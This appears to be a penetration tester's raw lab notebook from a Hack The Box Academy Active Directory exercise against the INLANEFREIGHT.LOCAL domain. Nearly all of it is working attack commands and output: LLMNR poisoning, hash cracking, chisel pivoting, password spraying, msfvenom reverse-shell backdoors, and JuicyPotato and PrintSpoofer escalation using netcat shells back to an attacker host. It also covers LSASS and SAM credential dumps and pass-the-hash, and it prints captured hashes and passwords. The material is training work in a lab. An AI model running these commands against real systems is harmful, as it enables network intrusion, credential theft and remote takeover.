## LAB

ssh htb-student@$TARGET
HTB_@cademy_stdnt!


### ifconfig of the Linux domain-joined machine

docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:9e:21:2f:a7  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.94.204  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::a794:56b5:a023:1711  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::a59d:6451:fe41:61d8  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:e5:e3  txqueuelen 1000  (Ethernet)
        RX packets 237  bytes 20619 (20.1 KiB)
        RX errors 0  dropped 9  overruns 0  frame 0
        TX packets 72  bytes 10384 (10.1 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.7.240  netmask 255.255.254.0  broadcast 172.16.7.255
        inet6 fe80::2957:2d31:5225:229a  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:5d:24  txqueuelen 1000  (Ethernet)
        RX packets 184  bytes 14416 (14.0 KiB)
        RX errors 0  dropped 12  overruns 0  frame 0
        TX packets 15  bytes 1062 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 16  bytes 976 (976.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 16  bytes 976 (976.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


### Enumerate hosts and users

sudo responder -I ens224 

[!] Error starting TCP server on port 3389, check permissions or other servers running.

fping -asgq 172.16.7.0/23

172.16.7.3
172.16.7.50
172.16.7.60
172.16.7.240

vi hosts.lst
sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d" " -f5
inlanefreight.local
172.16.7.50
172.16.7.60
172.16.7.240

GetUserSPNs.py -dc-ip 172.16.7.3 INLANEFREIGHT.LOCAL/htb-sudent

kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.7.3 list.txt -o valid_ad_users

2023/12/09 11:13:45 >  [+] VALID USERNAME:	 morris@INLANEFREIGHT.LOCAL
2023/12/09 11:13:46 >  [+] VALID USERNAME:	 witold@INLANEFREIGHT.LOCAL

### Using LLMNR to capture AB920 hash and crack it with hashcat

sudo responder -I ens224
[*] Skipping previously captured hash for INLANEFREIGHT\AB920
sudo responder -I ens224 -v

AB920::INLANEFREIGHT:fd08ea5213444249:061EF85D379C735CE8279AEB8430205D:01010000000000000077E541922ADA019DAEDC7F5AEA3284000000000200080059005A004200380001001E00570049004E002D005700500043005900420045005900550043005500450004003400570049004E002D00570050004300590042004500590055004300550045002E0059005A00420038002E004C004F00430041004C000300140059005A00420038002E004C004F00430041004C000500140059005A00420038002E004C004F00430041004C00070008000077E541922ADA0106000400020000000800300030000000000000000000000000200000A95B350804FBEBC02D80F0B53B94FA2612558CC09A16E94A4D945A6E0A56225D0A0010000000000000000000000000000000000009002E0063006900660073002F0049004E004C0041004E0045004600520049004700480054002E004C004F00430041004C00000000000000000000000000

vi SMB-NTLMv2-SSP-172.16.7.3.txt
hashcat -m 5600 SMB-NTLMv2-SSP-172.16.7.3.txt /usr/share/wordlists/rockyou.txt 
weasal


### Pivoting to MS01 using chisel

sudo nmap -sS -iL hosts.lst

sudo nmap -sL -iL hosts.lst

On our attack host :
git clone https://github.com/jpillora/chisel.git
cd chisel
go build
scp chisel htb-student@$TARGET:~/
HTB_@cademy_stdnt!

sudo vi /etc/proxychains.conf
\# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080

sudo ./chisel server --reverse -v -p 1234 --socks5

ssh htb-student@$TARGET

On target :
./chisel client -v 10.10.15.70:1234 R:socks

proxychains sudo nmap -sL -iL hosts.lst
proxychains sudo nmap -sL 172.16.7.0/23

proxychains sudo nmap -sC -sV -oA nmap -iL hosts.lst --stats-every=5s
proxychains xfreerdp /u:AB920 /p:"weasal" /v:172.16.7.50
hostname
MS01


### Try to gather credentials using LaZagne.exe

On Pwn Box :
wget https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe
scp LaZagne.exe htb-student@$TARGET:~/

On Linux pivot :
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support share /home/htb-student/ -user test -password test


net use n: \\172.16.7.240\share /user:test test
The command completed successfully.

copy n:\LaZagne.exe

start lazagne.exe all

--> FAILED

### Kerberoasting

GetUserSPNs.py -dc-ip 172.16.7.3 INLANEFREIGHT.LOCAL/AB920
weasal
GetUserSPNs.py -dc-ip 172.16.7.3 INLANEFREIGHT.LOCAL/AB920 -request 
weasal

No entries found!

GetUserSPNs.py -dc-ip 172.16.7.3 INLANEFREIGHT.LOCAL/htb-student -request 

Error in bindRequest -> invalidCredentials

On attack box :

git clone https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
cd Ghostpack-CompiledBinaries/
scp Rubeus.exe htb-student@$TARGET:~/
HTB_@cademy_stdnt!

On Pivot :

sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support share /home/htb-student/ -user test -password test

On target :
net use n: \\172.16.7.240\share /user:test test
copy n:\Rubeus.exe
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap /outfile:type.hash
[X] LDAP query failed, try specifying more domain information or specific SPNs.

git clone https://github.com/PowerShellMafia/PowerSploit.git
scp PowerSploit/Recon/PowerView.ps1 htb-student@$TARGET:~/
HTB_@cademy_stdnt!

copy n:\PowerView.ps1
Import-Module .\PowerView.ps1

Get-DomainUser * -spn | select samaccountname

samaccountname
--------------
krbtgt

### Password spraying


wget https://academy.hackthebox.com/storage/resources/Password-Attacks.zip
unzip Password-Attacks.zip 

scp username.list htb-student@$TARGET:~/
scp password.list htb-student@$TARGET:~/
HTB_@cademy_stdnt!


hydra -L username.list -P password.list smb://172.16.7.50

nmap -sV 172.16.7.50
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-10 05:26 EST
Nmap scan report for 172.16.7.50
Host is up (0.061s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

crackmapexec smb 172.16.7.50 -u username.list -p password.list --shares

git clone https://github.com/dafthack/DomainPasswordSpray.git
scp DomainPasswordSpray/DomainPasswordSpray.ps1 htb-student@$TARGET:~/
HTB_@cademy_stdnt!

copy n:\DomainPasswordSpray.ps1
Import-Module .\DomainPasswordSpray.ps1

At C:\Users\AB920\DomainPasswordSpray.ps1:261 char:21
+         Write-Host "$Message: Waiting for $($Seconds/60) minutes. $($ ...
+                     ~~~~~~~~~
Variable reference is not valid. ':' was not followed by a valid variable name character. Consider using ${} to
delimit the name.

Write-Host "$Message: Waiting for $($Seconds/60) minutes. $($Seconds - $Count)" 
---> replaced by
Write-Host "${Message}: Waiting for $($Seconds/60) minutes. $($Seconds - $Count)"

[*] SUCCESS! User:BR086 Password:Welcome1

proxychains xfreerdp /u:BR086 /p:"Welcome1" /v:172.16.7.50

--> SUCCESS

### Extract credentials using snaffler.exe

wget https://github.com/SnaffCon/Snaffler/releases/download/1.0.140/Snaffler.exe
scp Snaffler.exe htb-student@$TARGET:~/
HTB_@cademy_stdnt!

sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support share /home/htb-student/ -user test -password test
net use n: \\172.16.7.240\share /user:test test
copy n:\Snaffler.exe
.\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data

ID=netdb;Password=D@ta_bAse_adm1n!"/>

ping SQL01

Pinging SQL01.INLANEFREIGHT.LOCAL [172.16.7.60] with 32 bytes of data:
Reply from 172.16.7.60: bytes=32 time<1ms TTL=128

proxychains xfreerdp /u:netdb /p:"D@ta_bAse_adm1n!" /v:172.16.7.60

--> Failed

git clone https://github.com/NetSPI/PowerUpSQL.git
cd PowerUpSQL/
scp PowerUpSQL.ps1 htb-student@$TARGET:~/
HTB_@cademy_stdnt!

copy n:\PowerUpSQL.ps1
Import-Module .\PowerUpSQL.ps1


Get-SQLQuery -Verbose -Instance "172.16.7.60,1433" -username "inlanefreight\netdb" -password "D@ta_bAse_adm1n!" -query 'Select @@version'

mssqlclient.py INLANEFREIGHT/netdb@172.16.7.60 -windows-auth

Password:
[*] Encryption required, switching to TLS
[-] ERROR(SQL01\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.

mssqlclient.py INLANEFREIGHT/netdb@172.16.7.60
mssqlclient.py netdb@172.16.7.60
D@ta_bAse_adm1n!

xp_cmdshell type C:\Users\Administrator\Desktop\flag.txt

xp_cmdshell whoami
output                                                                             
nt service\mssql$sqlexpress                                                        
NULL    

SELECT SYSTEM_USER
netdb
SELECT IS_SRVROLEMEMBER('sysadmin')
1

EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
sa

proxychains xfreerdp /u:netdb /p:"D@ta_bAse_adm1n!" /v:172.16.7.60
--> Failed

SELECT * FROM OPENROWSET(BULK N'C:/Users/Administrator/Desktop/flag.txt', SINGLE_CLOB) AS Contents

sqlcmd -S WIN-HARD -U fiona -P '48Ns72!bns74@S84NNNSl' -y 30 -Y 30

proxychains xfreerdp /u:BR086 /p:"Welcome1" /v:172.16.7.50




nmap -sC -sV -oA nmap 172.16.7.60 --stats-every=5s

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2023-12-12T20:33:46+00:00; 0s from scanner time.
| ms-sql-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: SQL01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: SQL01.INLANEFREIGHT.LOCAL
|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-12-12T19:45:57
|_Not valid after:  2053-12-12T19:45:57
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: SQL01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:41:33 (VMware)
| ms-sql-info: 
|   Windows server name: SQL01
|   172.16.7.60\SQLEXPRESS: 
|     Instance name: SQLEXPRESS
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 1433
|_    Clustered: false
| smb2-time: 
|   date: 2023-12-12T20:33:41
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required


### Try to transfer binary to SQL01 instance

smbclient -N -L //172.16.7.60
session setup failed: NT_STATUS_ACCESS_DENIED

smbmap -H 172.16.7.60
[!] Authentication error on 172.16.7.60

rpcclient -U "netdb" 172.16.7.60
D@ta_bAse_adm1n!
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE

smbmap -H 172.16.7.60 --upload JuicyPotato.exe "\JuicyPotato.exe"
[!] Authentication error on 172.16.7.60

rpcclient -U "INLANEFREIGHT/netdb" 172.16.7.60
D@ta_bAse_adm1n!
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE

--> Failed 


### Using meterpreter to transfer files


wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
git clone https://github.com/int0x33/nc.exe/
git clone https://github.com/dievus/printspoofer.git

scp JuicyPotato.exe htb-student@$TARGET:~/
HTB_@cademy_stdnt!

scp nc.exe/nc.exe htb-student@$TARGET:~/
HTB_@cademy_stdnt!

scp printspoofer/PrintSpoofer.exe htb-student@$TARGET:~/
HTB_@cademy_stdnt!

ssh htb-student@$TARGET
HTB_@cademy_stdnt!

msfconsole -q
use exploit/windows/mssql/mssql_payload
set LHOST 172.16.7.240 
set RHOSTS 172.16.7.60

[*] Started reverse TCP handler on 172.16.7.240:4444 
[*] 172.16.7.60:1433 - Invalid SQL Server credentials

set USERNAME netdb
set PASSWORD D@ta_bAse_adm1n!
exploit


meterpreter > dir
Listing: C:\Windows\system32

sysinfo
Computer        : SQL01
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : INLANEFREIGHT
Logged On Users : 8
Meterpreter     : x86/windows


### JuicyPotato --> Failed

upload JuicyPotato.exe c:\\Users\\Public
[*] uploading  : /home/htb-student/JuicyPotato.exe -> c:\Users\Public
[*] uploaded   : /home/htb-student/JuicyPotato.exe -> c:\Users\Public\JuicyPotato.exe

upload nc.exe c:\\Users\\Public
[*] uploading  : /home/htb-student/nc.exe -> c:\Users\Public
[*] uploaded   : /home/htb-student/nc.exe -> c:\Users\Public\nc.exe

upload PrintSpoofer.exe c:\\Users\\Public
[*] uploading  : /home/htb-student/PrintSpoofer.exe -> c:\Users\Public
[*] uploaded   : /home/htb-student/PrintSpoofer.exe -> c:\Users\Public\PrintSpoofer.exe



meterpreter > dir c:\\Users\\Public
Listing: c:\Users\Public

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040555/r-xr-xr-x  0       dir   2022-04-30 19:05:33 -0400  AccountPictures
040555/r-xr-xr-x  0       dir   2018-09-15 03:19:03 -0400  Desktop
040555/r-xr-xr-x  0       dir   2021-10-06 16:38:04 -0400  Documents
040555/r-xr-xr-x  0       dir   2018-09-15 03:19:03 -0400  Downloads
100777/rwxrwxrwx  347648  fil   2023-12-12 17:15:58 -0500  JuicyPotato.exe
040555/r-xr-xr-x  0       dir   2018-09-15 03:19:03 -0400  Libraries
040555/r-xr-xr-x  0       dir   2018-09-15 03:19:03 -0400  Music
040555/r-xr-xr-x  0       dir   2018-09-15 03:19:03 -0400  Pictures
040555/r-xr-xr-x  0       dir   2018-09-15 03:19:03 -0400  Videos
100666/rw-rw-rw-  174     fil   2018-09-15 03:16:48 -0400  desktop.ini
100777/rwxrwxrwx  38616   fil   2023-12-12 17:20:35 -0500  nc.exe


msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.7.240 LPORT=4444 -f exe > backdoor.exe
upload backdoor.exe c:\\Users\\Public


mssqlclient.py INLANEFREIGHT/netdb@172.16.7.60
D@ta_bAse_adm1n!

xp_cmdshell c:\Users\Public\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\Users\Public\nc.exe 172.16.7.240 8443 -e cmd.exe" -t *

sudo nc -lvnp 8443
--> Failed



msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.7.240 LPORT=4444 -f exe > backdoor4444.exe
upload backdoor4444.exe c:\\Users\\Public

msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.7.240 LPORT=4444 -f exe > backdoor4445.exe
upload backdoor4445.exe c:\\Users\\Public


use exploit/multi/handler
set LHOST 172.16.7.240 
set LPORT 4444
exploit

shell 
c:\Users\Public\JuicyPotato.exe -l 4444 -p c:\Users\Public\backdoor4444.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}
c:\Users\Public\JuicyPotato.exe -l 4445 -p c:\Users\Public\backdoor.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 4445
COM -> recv failed with error: 10038

https://ohpe.it/juicy-potato/CLSID/
{4991d34b-80a1-4291-83b6-3328366b9097}
{1ecca34c-e88a-44e3-8d6a-8921bde9e452}
{659cdea7-489e-11d9-a9cd-000d56965251}
{bb6df56b-cace-11dc-9992-0019b93a3a84}
{4d233817-b456-4e75-83d2-b17dec544d12}
{F087771F-D74F-4C1A-BB8A-E16ACA9124EA}
{69AD4AEE-51BE-439b-A92C-86AE490E8B30}
{6d18ad12-bde3-4393-b311-099c346e6df9}
{03ca98d6-ff5d-49b8-abc6-03dd84127020}


c:\Users\Public\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\Users\Public\nc.exe 172.16.7.240 8443 -e cmd.exe" -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}
c:\Users\Public\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\Users\Public\nc.exe 172.16.7.240 8443 -e cmd.exe" -t * -c {1ecca34c-e88a-44e3-8d6a-8921bde9e452}	
c:\Users\Public\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\Users\Public\nc.exe 172.16.7.240 8443 -e cmd.exe" -t * -c {659cdea7-489e-11d9-a9cd-000d56965251}	
c:\Users\Public\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\Users\Public\nc.exe 172.16.7.240 8443 -e cmd.exe" -t * -c {bb6df56b-cace-11dc-9992-0019b93a3a84}
c:\Users\Public\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\Users\Public\nc.exe 172.16.7.240 8443 -e cmd.exe" -t * -c {4d233817-b456-4e75-83d2-b17dec544d12}
c:\Users\Public\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\Users\Public\nc.exe 172.16.7.240 8443 -e cmd.exe" -t * -c {F087771F-D74F-4C1A-BB8A-E16ACA9124EA}
c:\Users\Public\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\Users\Public\nc.exe 172.16.7.240 8443 -e cmd.exe" -t * -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
c:\Users\Public\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\Users\Public\nc.exe 172.16.7.240 8443 -e cmd.exe" -t * -c {6d18ad12-bde3-4393-b311-099c346e6df9}
c:\Users\Public\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\Users\Public\nc.exe 172.16.7.240 8443 -e cmd.exe" -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}

c:\Users\Public\JuicyPotato.exe -l 4444 -p c:\Users\Public\backdoor4444.exe -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}
c:\Users\Public\JuicyPotato.exe -l 4444 -p c:\Users\Public\backdoor4444.exe -t * -c {1ecca34c-e88a-44e3-8d6a-8921bde9e452}	
c:\Users\Public\JuicyPotato.exe -l 4444 -p c:\Users\Public\backdoor4444.exe -t * -c {659cdea7-489e-11d9-a9cd-000d56965251}	
c:\Users\Public\JuicyPotato.exe -l 4444 -p c:\Users\Public\backdoor4444.exe -t * -c {bb6df56b-cace-11dc-9992-0019b93a3a84}
c:\Users\Public\JuicyPotato.exe -l 4444 -p c:\Users\Public\backdoor4444.exe -t * -c {4d233817-b456-4e75-83d2-b17dec544d12}
c:\Users\Public\JuicyPotato.exe -l 4444 -p c:\Users\Public\backdoor4444.exe -t * -c {F087771F-D74F-4C1A-BB8A-E16ACA9124EA}
c:\Users\Public\JuicyPotato.exe -l 4444 -p c:\Users\Public\backdoor4444.exe -t * -c {69AD4AEE-51BE-439b-A92C-86AE490E8B30}
c:\Users\Public\JuicyPotato.exe -l 4444 -p c:\Users\Public\backdoor4444.exe -t * -c {6d18ad12-bde3-4393-b311-099c346e6df9}
c:\Users\Public\JuicyPotato.exe -l 4444 -p c:\Users\Public\backdoor4444.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}

### PrintSpoofer --> Success

upload PrintSpoofer.exe c:\\Users\\Public
[*] uploading  : /home/htb-student/PrintSpoofer.exe -> c:\Users\Public
[*] uploaded   : /home/htb-student/PrintSpoofer.exe -> c:\Users\Public\PrintSpoofer.exe

upload nc.exe c:\\Users\\Public
[*] uploading  : /home/htb-student/nc.exe -> c:\Users\Public
[*] uploaded   : /home/htb-student/nc.exe -> c:\Users\Public\nc.exe

shell

c:\Users\Public\PrintSpoofer.exe -c "c:\Users\Public\nc.exe 172.16.7.240 8443 -e cmd"

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>type c:\Users\Administrator\Desktop\flag.txt
type c:\Users\Administrator\Desktop\flag.txt
s3imp3rs0nate_cl@ssic

### procdump for LSSAS dump --> Failed

dir procdump /s

dir *procdump* /s
dir *procdump* /s
 Volume in drive C has no label.
 Volume Serial Number is B8B3-0D72
File Not Found
curl https://download.sysinternals.com/files/Procdump.zip --output Procdump.zip
unzip Procdump.zip
scp procdump.exe htb-student@$TARGET:~/
HTB_@cademy_stdnt!

upload procdump.exe c:\\Users\\Public

c:\Users\Public\procdump.exe -accepteula -ma lsass.exe c:\Users\Public\lsass.dmp

[06:09:09] Dump 1 initiated: C:\Windows\system32\lsass.dmp
[06:09:09] Dump 1 writing: Estimated dump file size is 47 MB.
[06:09:10] Dump 1 complete: 47 MB written in 0.7 seconds
[06:09:10] Dump count reached.

meterpreter :
download c:\\Users\\Public\\lsass.dmp

scp lsass.dmp htb-student@10.10.14.102:~/

python3 -m http.server
wget $TARGET:8000/lsass.dmp

pypykatz lsa minidump lsass.dmp

### SAM DUMP

reg.exe save hklm\sam C:\Users\Public\sam.save
reg.exe save hklm\system C:\Users\Public\system.save
reg.exe save hklm\security C:\Users\Public\security.save

download c:\\Users\\Public\\sam.save
download c:\\Users\\Public\\system.save
download c:\\Users\\Public\\security.save

python3 -m http.server
wget $TARGET:8000/sam.save
wget $TARGET:8000/system.save
wget $TARGET:8000/security.save


python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

[*] Target system bootKey: 0x2cdbbee2d1fb9cfb7cf7189fa66971a6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::
[*] Dumping cached domain logon information (domain/username:hash)
INLANEFREIGHT.LOCAL/Administrator:$DCC2$10240#Administrator#30376b08e0552233fba8af8e0be0fb13
INLANEFREIGHT.LOCAL/mssqlsvc:$DCC2$10240#mssqlsvc#7fd9a156f003adec1eed9c9e1165b973
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:e0abc4547bd1a43c709793a9092ee7afa583dabc3d3e53591883dcd4d6de64511197ed5ff18c8ec5b043691dae4258b3ca13cf9b6c71d7dfff7fd9ff978882c7ca84e4787e3b09d3bf416dd06972aa644f7c2ef45e55f8899e41405a60751ddf9ccb829b99680a02c6366ada5d5b91a98c0742defbc5661093e4c58176b51c702f439b996b403fd5b0d2307ba3e46319ba25681c4a119b24399de85cf9dd6e7750803b513e764ad3c5cf310e60126096fe8f645dca042f09cb23d87917bb0be6f3571b59a80420f3519ecc7a209bda0fce79fb6d21c178296f1e95e21a46362439566d62762cff3ad6672b31afb560ee
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:0c18b825640634d772300287495478f3
[*] DefaultPassword 
(Unknown User):Sup3rS3cur3maY5ql$3rverE
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x97b7061765871cd4f916f138e8188ff43830deb6
dpapi_userkey:0x0d9f2fafc12db65450e57f928bb671a1e1b3d764
[*] NL$KM 
 0000   A2 52 9D 31 0B B7 1C 75  45 D6 4B 76 41 2D D3 21   .R.1...uE.KvA-.!
 0010   C6 5C DD 04 24 D3 07 FF  CA 5C F4 E5 A0 38 94 14   .\..$....\...8..
 0020   91 64 FA C7 91 D2 0E 02  7A D6 52 53 B4 F4 A9 6F   .d......z.RS...o
 0030   58 CA 76 00 DD 39 01 7D  C5 F7 8F 4B AB 1E DC 63   X.v..9.}...K...c
NL$KM:a2529d310bb71c7545d64b76412dd321c65cdd0424d307ffca5cf4e5a03894149164fac791d20e027ad65253b4f4a96f58ca7600dd39017dc5f78f4bab1edc63
[*] Cleaning up... 

sudo hashcat -m 1000 bdaffbfe64f1fc646a3353be1c2c3c99 /usr/share/wordlists/rockyou.txt
--> Failed

### Pass-the-hash

proxychains xfreerdp /u:BR086 /p:"Welcome1" /v:172.16.7.50
proxychains xfreerdp /u:"Administrator" /p:"Sup3rS3cur3maY5ql$3rverE" /v:172.16.7.50

proxychains xfreerdp  /v:172.16.7.50 /u:Administrator /pth:30376b08e0552233fba8af8e0be0fb13
proxychains evil-winrm -i 172.16.7.50 -u Administrator -H 30376b08e0552233fba8af8e0be0fb13

proxychains xfreerdp  /v:172.16.7.50 /u:Administrator /pth:bdaffbfe64f1fc646a3353be1c2c3c99
--> Failed
proxychains xfreerdp /u:BR086 /p:"Welcome1" /v:172.16.7.50
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

proxychains evil-winrm -i 172.16.7.50 -u Administrator -H bdaffbfe64f1fc646a3353be1c2c3c99
--> OK

*Evil-WinRM* PS C:\Users\Administrator\Documents> type c:\Users\Administrator\Desktop\flag.txt
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.7.50:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.7.50:5985  ...  OK
exc3ss1ve_adm1n_r1ights!

### ACL Enumeration

git clone https://github.com/PowerShellMafia/PowerSploit.git
scp PowerSploit/Recon/PowerView.ps1 htb-student@$TARGET:~/
HTB_@cademy_stdnt!

proxychains evil-winrm -i 172.16.7.50 -u Administrator -H bdaffbfe64f1fc646a3353be1c2c3c99
upload PowerView.ps1

Import-Module .\PowerView.ps1

Import-Module .\PowerView.ps1
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

Warning: [Get-DomainGroupMember] Error searching for group with identity 'Domain Admins': Exception calling "FindOne" with "0" argument(s): "The specified domain either does not exist or could not be contacted.

$sid = Convert-NameToSid netdb
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 

--> Failed

### LLMNR

https://github.com/Kevin-Robertson/Inveigh.git
scp Inveigh/Inveigh.ps1 htb-student@$TARGET:~/
HTB_@cademy_stdnt!

upload Inveigh.ps1

Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y

type Inveigh-NTLMv2.txt
CT059::INLANEFREIGHT:5CD3B8399A5BADC3:6DE6D31814B275287F7432DE47E1FE55:0101000000000000013A5E914E2FDA01C7315473955F64290000000002001A0049004E004C0041004E0045004600520045004900470048005400010008004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00030030004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0007000800013A5E914E2FDA0106000400020000000800300030000000000000000000000000200000CB82471669621FD73304C4CAE0443A175A36C4885CA07D6894A22D6AD8AC48C00A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0037002E0035003000000000000000000000000000
AB920::INLANEFREIGHT:CD44836A2D958321:DE72EE4785DD8E47DA2AB981CC774914:0101000000000000EA1A54974E2FDA01C235E9622B2332260000000002001A0049004E004C0041004E0045004600520045004900470048005400010008004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00030030004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0007000800EA1A54974E2FDA0106000400020000000800300030000000000000000000000000200000CB82471669621FD73304C4CAE0443A175A36C4885CA07D6894A22D6AD8AC48C00A0010000000000000000000000000000000000009002E0063006900660073002F0049004E004C0041004E0045004600520049004700480054002E004C004F00430041004C00000000000000000000000000

download Inveigh-NTLMv2.txt

python3 -m http.server
wget $TARGET:8000/Inveigh-NTLMv2.txt

hashcat -m 5600 Inveigh-NTLMv2.txt /usr/share/wordlists/rockyou.txt

Inveigh-NTLMv2.txt: Byte Order Mark (BOM) was detected

hashcat -m 5600 6DE6D31814B275287F7432DE47E1FE55 /usr/share/wordlists/rockyou.txt
--> Failed

vi hash.txt
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
charlie1

## ACCESS TO DC01 --> Failed

evil-winrm -i 172.16.7.3 -u CT059 -p charlie1
xfreerdp /u:CT059 /p:"charlie1" /v:172.16.7.3
xfreerdp /u:CT059 /p:"charlie1" /v:172.16.7.50
--> Failed

Get-DomainGroup -Identity "Domain Admins" | select memberof
wget https://github.com/BloodHoundAD/SharpHound/releases/download/v2.3.0/SharpHound-v2.3.0-debug.zip
unzip SharpHound-v2.3.0-debug.zip
scp SharpHound.exe htb-student@$TARGET:~/
